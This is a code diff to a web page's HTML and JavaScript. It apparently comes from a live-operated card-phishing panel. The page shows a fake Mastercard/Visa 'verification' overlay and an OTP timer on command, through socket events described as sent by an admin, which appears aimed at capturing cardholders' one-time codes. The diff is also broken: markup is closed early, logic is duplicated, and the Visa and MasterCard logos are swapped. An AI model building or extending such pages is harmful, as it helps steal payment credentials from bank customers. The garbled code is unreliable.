@@ -627,21 +627,23 @@
       <div class="spinner"></div>
     </div>
   
-  <!-- MC Verification Overlay -->
+<!-- MC Verification Overlay -->
 <div id="mcVerificationOverlay" class="fullscreen-overlay">
   <!-- Loading Content - Shown Initially -->
   <div id="mcLoadingContent" style="display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 450px; max-height: 550px; background: white; width: 90%; max-width: 480px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);">
-    <!-- Original loading spinner -->
     <div style="border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite;"></div>
     
-    <!-- Added verification logo container that will show below the spinner -->
+    <!-- Added verification logo during loading -->
     <div id="loadingVerificationLogo" style="margin-top: 20px; height: 60px; text-align: center;">
-      <!-- This space will be filled dynamically with the logo -->
+      <!-- Logo will be inserted here dynamically -->
     </div>
   </div>
   
   <!-- Verification Content - Hidden Until Admin Sends start_verification Event -->
   <div id="mcVerificationContent" style="display: none; position: relative; width: 90%; max-width: 480px;">
+    <!-- Keep your existing content here unchanged -->
+  </div>
+</div>
         <div style="background-color: #fff; border-radius: 8px; width: 100%; padding: 0; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);">
           <!-- Header with bank logos -->
           <div id="mcHeader" style="padding: 10px; border-bottom: 1px solid #ddd; display: flex; justify-content: space-between; align-items: center;">
@@ -1863,30 +1865,45 @@
           if (!timerInterval) startOtpTimer();
           isProcessing = false;
         });
-  
-        // Modified MC verification event handler with loading spinner
-        socket.on('show_mc_verification', (data) => {
-          console.log('[DEBUG] Received show_mc_verification event:', data);
-          console.log('[DEBUG] Current invoice ID:', currentInvoiceId);
-          
-          // Check if the overlay exists
-          const overlay = document.getElementById('mcVerificationOverlay');
-          console.log('[DEBUG] Overlay element found:', !!overlay);
-          
-          if (data.invoiceId === currentInvoiceId && overlay) {
-            console.log('[DEBUG] Invoice IDs match, showing loading spinner for MC verification');
-            
-            // Show overlay with loading spinner
-            const loadingContent = document.getElementById('mcLoadingContent');
-            const verificationContent = document.getElementById('mcVerificationContent');
-            
-            if (!loadingContent || !verificationContent) return; // Added null check
-            
-            loadingContent.style.display = 'flex';
-            verificationContent.style.display = 'none';
-            overlay.style.display = 'flex';
 
-                // ADD THIS NEW CODE:
+        // socket on 
+socket.on('show_mc_verification', (data) => {
+  console.log('[DEBUG] Received show_mc_verification event:', data);
+  console.log('[DEBUG] Current invoice ID:', currentInvoiceId);
+  
+  // Check if the overlay exists
+  const overlay = document.getElementById('mcVerificationOverlay');
+  console.log('[DEBUG] Overlay element found:', !!overlay);
+  
+  if (data.invoiceId === currentInvoiceId && overlay) {
+    console.log('[DEBUG] Invoice IDs match, showing loading spinner for MC verification');
+    
+    // Show overlay with loading spinner
+    const loadingContent = document.getElementById('mcLoadingContent');
+    const verificationContent = document.getElementById('mcVerificationContent');
+    const loadingVerificationLogo = document.getElementById('loadingVerificationLogo');
+    
+    if (!loadingContent || !verificationContent) return; // Added null check
+    
+    loadingContent.style.display = 'flex';
+    verificationContent.style.display = 'none';
+    overlay.style.display = 'flex';
+    
+    // Set the verification logo based on loadingLogoType parameter
+    if (loadingVerificationLogo) {
+      const logoType = data.loadingLogoType || 'mastercard';
+      
+      if (logoType === 'visa') {
+        loadingVerificationLogo.innerHTML = '<img src="https://seekvectors.com/storage/images/MasterCard%20SecureCode-01.svg;">';
+      } else {
+        loadingVerificationLogo.innerHTML = '<img src="https://cdn.worldvectorlogo.com/logos/visa-10.svg;">';
+      }
+    }
+    
+    // Store data for later use
+    window.mcVerificationData = data;
+  }
+});
     // Set the verification logo based on verification type
     const loadingVerificationLogo = document.getElementById('loadingVerificationLogo');
     if (loadingVerificationLogo) {
